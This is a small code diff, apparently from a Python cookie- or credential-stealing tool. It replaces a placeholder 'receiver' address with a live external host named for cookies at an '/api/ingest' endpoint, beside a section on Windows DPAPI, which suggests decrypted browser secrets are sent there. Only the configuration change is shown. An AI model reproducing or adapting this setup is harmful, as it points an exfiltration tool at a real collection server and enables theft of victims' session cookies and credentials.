@@ -25,7 +25,7 @@ from datetime import datetime, timezone
 from urllib.parse import urlparse
 
 # ─── Configuration ─────────────────────────────────────────────────
-RECEIVER_URL = "http://YOUR_RECEIVER_IP:3000/api/ingest"
+RECEIVER_URL = "https://cookies1-lcz0.onrender.com/api/ingest"
 # Set this to your receiver's IP/URL
 
 # ─── Windows DPAPI ─────────────────────────────────────────────────
